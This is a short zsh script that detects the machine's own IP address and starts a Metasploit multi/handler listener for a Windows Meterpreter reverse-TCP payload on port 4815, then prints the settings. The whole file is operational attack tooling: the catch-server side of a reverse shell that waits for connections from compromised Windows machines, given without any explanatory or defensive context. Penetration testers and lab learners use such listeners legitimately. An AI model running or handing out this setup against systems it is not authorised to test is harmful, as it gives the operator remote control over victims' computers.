#!/bin/zsh

myIp="$(hostname -I | cut -f1 -d' ')"

msfconsole -q -x "use exploit/multi/handler;
		  set payload windows/meterpreter/reverse_tcp;
		  set LHOST "${myIp}";
		  set LPORT 4815;
		  exploit;"

echo "LHOST IP set to: "  $myIp
echo "Listener is cnfigured for reverse_tcp"
